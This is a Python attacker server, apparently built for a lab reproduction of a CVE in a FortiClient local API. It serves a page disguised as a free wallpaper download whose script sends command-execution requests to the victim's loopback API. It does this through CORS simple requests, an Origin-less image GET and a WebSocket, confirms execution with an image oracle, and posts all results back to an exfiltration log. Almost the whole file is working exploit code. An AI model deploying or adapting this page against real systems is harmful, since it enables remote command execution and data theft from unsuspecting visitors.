#!/usr/bin/env python3
"""
The attacker's web site -- the drive-by page for CVE-2026-121529.

This is the "malicious web page" half of the attack.  It is served from a *separate*
container on the lab network, so the browser sees a genuine cross-origin situation:
page origin  = http://<attacker>:8080
target      = http://127.0.0.1:9191   (the FortiClient local API, on the victim's loopback)

The page performs the cross-origin request in the two flavours that matter:

  json    POST with `Content-Type: application/json`  -> triggers a CORS *preflight*.
  simple  POST with `Content-Type: text/plain`        -> a CORS *simple request*:
                                                       no preflight at all, the browser
                                                       sends it and the server acts on it
                                                       even when the response is opaque.

Both results (including the response body) are posted back to the attacker's own server
(`/report`) -- that is the data-exfiltration step, and it is what proves the origin
validation error is exploitable rather than merely "a request was sent".
"""

import json
import os
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, quote, urlparse

PORT = int(os.environ.get("ATTACKER_PORT", "8080"))
# The attacker also listens on the port the FortiClient local API uses.  That is what a
# real DNS-rebinding attack needs: the malicious page has to be served from the same
# host:port as the API it attacks, so that the browser treats the later API call as
# *same-origin* and applies no CORS check at all.
PORT2 = int(os.environ.get("ATTACKER_PORT2", "9191"))
RESULTS = os.environ.get("ATTACKER_RESULTS", "/results")

PAGE = """<!doctype html>
<html>
<head><meta charset="utf-8"><title>Free wallpaper download</title></head>
<body style="font-family:sans-serif">
<h1>Preparing your wallpaper...</h1>
<pre id="log">working</pre>
<script>
// The malicious script.  Everything here is what the attacker's page runs inside the
// victim's browser, with the FortiClient local API reachable on 127.0.0.1:9191.
(async () => {
  const q = new URLSearchParams(location.search);
  const target  = q.get('target') || 'http://127.0.0.1:9191/api/v1/privileged/session';
  const legacy  = q.get('legacy') || 'http://127.0.0.1:9191/api/v1/privileged/session/legacy';
  const files   = q.get('files') || 'http://127.0.0.1:9191/api/v1/files/proof.png';
  const ws      = q.get('ws') || 'ws://127.0.0.1:9191/ws';
  const cmd     = q.get('cmd') || 'id';
  const report  = q.get('report') || (location.origin + '/report');
  const out = { pageOrigin: location.origin, target: target, attempts: [] };

  async function attempt(name, url, init) {
    const rec = { name: name, url: url };
    try {
      const res = await fetch(url, { credentials: 'include', ...init });
      rec.status = res.status;
      rec.type   = res.type;
      try {
        const text = await res.text();
        rec.readable = true;
        rec.body = text.length > 4000 ? text.slice(0, 4000) + '...[truncated]' : text;
      } catch (e) {
        // The browser refused to hand the body to the script: the CORS check failed.
        rec.readable = false;
        rec.error = String(e);
      }
    } catch (e) {
      rec.error = String(e);
    }
    out.attempts.push(rec);
    return rec;
  }

  // 1) JSON body -> needs a preflight; a vulnerable API answers the preflight for any origin.
  await attempt('json', target, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: cmd })
  });

  // 2) text/plain body -> simple request, NO preflight, still reaches the API.
  await attempt('simple', target, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ command: cmd })
  });

  // 3) The endpoint that never sends CORS headers -> not readable, but still executed.
  await attempt('legacy-no-cors', legacy, {
    method: 'POST',
    headers: { 'Content-Type': 'text/plain' },
    body: JSON.stringify({ command: cmd })
  });

  // 4) A cross-origin <img> is a no-cors GET: the browser sends it WITHOUT an Origin
  //    header and without a preflight.  A server that validates the Origin but accepts
  //    a missing Origin (because its own native agent does not send one) executes it.
  await new Promise((resolve) => {
    const img = new Image();
    const rec = { name: 'img-csrf', url: null, readable: false };
    img.onload = () => { rec.loaded = true; out.attempts.push(rec); resolve(); };
    img.onerror = () => { rec.loaded = false; rec.note = 'image decode failed (response was not readable)'; out.attempts.push(rec); resolve(); };
    img.src = target.split('?')[0] + '?command=' + encodeURIComponent(cmd) + '&_=' + Date.now();
    rec.url = img.src;
    setTimeout(resolve, 4000);
  });

  // 5) The privileged session over a WebSocket.  A browser applies NO CORS policy to
  //    a WebSocket handshake -- no preflight, no Access-Control-* check -- so the page
  //    both sends the command and reads the full answer.
  await new Promise((resolve) => {
    let done = false;
    const rec = { name: 'websocket', url: ws, readable: false };
    const finish = () => { if (!done) { done = true; out.attempts.push(rec); resolve(); } };
    try {
      const sock = new WebSocket(ws);
      sock.onopen = () => { rec.opened = true; sock.send(JSON.stringify({ command: cmd })); };
      sock.onmessage = (ev) => { rec.readable = true; rec.body = String(ev.data).slice(0, 2000); finish(); };
      sock.onerror = () => { rec.error = 'websocket error'; finish(); };
      sock.onclose = () => { rec.closed = true; finish(); };
      setTimeout(finish, 6000);
    } catch (e) { rec.error = String(e); finish(); }
  });

  // 6) Confirmation oracle: the executed command drops a 1x1 PNG into the artefact
  //    store; if the image decodes, the command really ran.  This turns a blind RCE
  //    into a confirmed one even when the response itself is not readable.
  await new Promise((resolve) => {
    const img = new Image();
    const rec = { name: 'confirm-oracle', url: files, readable: false };
    img.onload = () => { rec.loaded = true; rec.confirmed = true; out.attempts.push(rec); resolve(); };
    img.onerror = () => { rec.loaded = false; rec.confirmed = false; out.attempts.push(rec); resolve(); };
    img.src = files + '?_' + Date.now();
    setTimeout(resolve, 4000);
  });

  // Exfiltrate everything back to the attacker.
  try {
    await fetch(report, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(out)
    });
  } catch (e) { /* ignore */ }

  window.__results = out;
  document.getElementById('log').textContent = JSON.stringify(out, null, 2);
})();
</script>
</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _send(self, code, body, ctype="text/html; charset=utf-8"):
        data = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        u = urlparse(self.path)
        if u.path in ("/", "/index.html", "/exploit.html"):
            return self._send(200, PAGE)
        if u.path == "/report":
            path = os.path.join(RESULTS, "exfil.jsonl")
            data = b""
            if os.path.exists(path):
                with open(path, "rb") as fh:
                    data = fh.read()
            return self._send(200, data.decode("utf-8", "replace"), "application/json")
        if u.path == "/robots.txt":
            return self._send(200, "User-agent: *\n")
        self._send(404, "not found")

    def do_POST(self):
        u = urlparse(self.path)
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n) if n else b""
        if u.path == "/report":
            os.makedirs(RESULTS, exist_ok=True)
            rec = {
                "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "referer": self.headers.get("Referer"),
                "origin": self.headers.get("Origin"),
                "ua": self.headers.get("User-Agent"),
                "body": raw.decode("utf-8", "replace"),
            }
            with open(os.path.join(RESULTS, "exfil.jsonl"), "a", encoding="utf-8") as fh:
                fh.write(json.dumps(rec) + "\n")
            return self._send(200, '{"ok":true}', "application/json")
        self._send(404, "not found")


def main():
    os.makedirs(RESULTS, exist_ok=True)
    servers = []
    for port in (PORT, PORT2):
        srv = ThreadingHTTPServer(("0.0.0.0", port), Handler)
        srv.daemon_threads = True
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        servers.append(srv)
        print("[attacker] serving malicious page on 0.0.0.0:%d" % port, flush=True)
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
